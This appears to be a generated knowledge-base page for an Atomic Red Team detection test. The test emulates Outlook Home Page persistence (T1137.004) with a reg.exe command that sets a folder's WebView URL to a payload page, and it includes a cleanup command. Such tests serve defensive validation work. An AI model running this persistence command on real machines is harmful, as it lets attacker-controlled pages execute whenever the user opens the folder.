---
atomic_guid: "7a91ad51-e6d2-4d43-9471-f26362f5738e"
title: "Install Outlook Home Page Persistence"
framework: "atomic"
generated: "true"
attack_technique_id: "T1137.004"
attack_technique_name: "Office Application Startup: Outlook Home Page"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.004/T1137.004.yaml"
build_date: "2026-04-27 19:12:27"
executor: "command_prompt"
aliases:
  - "7a91ad51-e6d2-4d43-9471-f26362f5738e"
  - "Install Outlook Home Page Persistence"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

This test simulates persistence being added to a host via the Outlook Home Page functionality. This causes Outlook to retrieve URL containing a malicious payload every time the targeted folder is viewed.

Triggering the payload requires manually opening Outlook and viewing the targetted folder (e.g. Inbox).

## ATT&CK Mapping

- [[kb/attack/techniques/T1137-office_application_startup#^t1137004-outlook-home-page|T1137.004: Outlook Home Page]]

## Input Arguments

### outlook_folder

- description: Name of the Outlook folder to modify the homepage setting for
- type: string
- default: Inbox

### outlook_version

- description: Version of Outlook that is installed
- type: float
- default: 16.0

### url

- description: URL to Outlook Home Page containing the payload to execute (can be local file:// or remote https://)
- type: string
- default: file://PathToAtomicsFolder\T1137.004\src\T1137.004.html

## Executor

- elevation_required: False
- name: command_prompt

### Command

```cmd
reg.exe add HKCU\Software\Microsoft\Office\#{outlook_version}\Outlook\WebView\#{outlook_folder} /v URL /t REG_SZ /d #{url} /f
```

### Cleanup

```cmd
reg.exe delete HKCU\Software\Microsoft\Office\#{outlook_version}\Outlook\WebView\#{outlook_folder} /v URL /f >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.004/T1137.004.yaml)
